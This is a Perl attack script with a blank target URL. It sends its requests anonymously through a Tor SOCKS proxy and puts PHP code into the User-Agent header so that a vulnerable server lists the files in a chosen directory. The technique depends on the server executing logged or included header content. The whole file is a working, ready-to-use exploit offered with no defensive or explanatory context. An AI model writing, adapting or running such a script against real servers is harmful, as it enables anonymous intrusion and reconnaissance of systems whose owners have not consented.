#!/usr/bin/perl -w
use strict;
use warnings;
use LWP::UserAgent;

my $url = ''; #Target URL
my $userAgent = LWP::UserAgent->new;
$userAgent->proxy([qw(http https)] => 'socks://127.0.0.1:9050');
$userAgent->show_progress('true');

#Consider changing the timeout if you experience problems
$userAgent->timeout(10);

#Prompt for target dir (on remote server)
print "Enter dir:";
my $dir = <>;
chomp($dir);

#Using php injection in the headers request to list the 
#files in the dir entered
$userAgent->agent('<? $dir="'. $dir . '";
$dh=opendir($dir);
while(false!==($filename=readdir($dh)))
{if(is_dir($filename)){echo "<dir>";}
elseif(is_file($filename)){echo "file";}
elseif(is_link($filename)){echo "link";}
echo "\t$filename\n";}
closedir($dh); ?>');

#Commit request
my $ack = $userAgent->get($url);
if ($ack->is_success) 
{
	print $ack->decoded_content;
}
else 
{
	#If it failed to fetch
    die $ack->status_line;
}
